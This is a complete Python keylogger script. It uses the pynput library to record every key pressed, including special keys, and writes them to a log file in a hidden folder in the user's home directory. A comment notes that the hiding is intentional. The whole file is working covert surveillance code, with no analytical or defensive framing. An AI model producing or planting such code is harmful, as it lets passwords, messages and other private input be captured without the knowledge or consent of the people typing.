from pynput.keyboard import Listener
import os
import time

# Path to save the log file, hidden in the user's home directory

logDirectory = os.path.expanduser('~') + '/.hidden_logs'
if not os.path.exists(logDirectory):
    os.makedirs(logDirectory)
logFilePath = os.path.join(logDirectory, 'keystroke.log')

def onPress(key):
    with open(logFilePath, 'a') as logFile:
        try:
            logFile.write(f"{key.char}")
        except AttributeError:
        # Special keys
            if key == key.space:
            # Write a space to the file instead of 'Key.space'
                logFile.write(" ")
            else:
                logFile.write(f" {key} ")

def main():
    with Listener(onPress=onPress) as listener:
        listener.join()

if __name__ == '__main__':
    main()
